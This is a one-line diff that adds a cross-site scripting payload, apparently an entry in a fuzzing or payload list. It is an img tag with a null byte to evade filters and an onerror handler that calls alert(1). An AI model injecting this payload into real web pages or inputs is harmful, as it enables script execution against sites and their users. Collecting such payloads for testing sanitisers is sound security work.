@@ -1,0 +1,1 @@
+<img \x00src=x onerror="javascript:alert(1)">
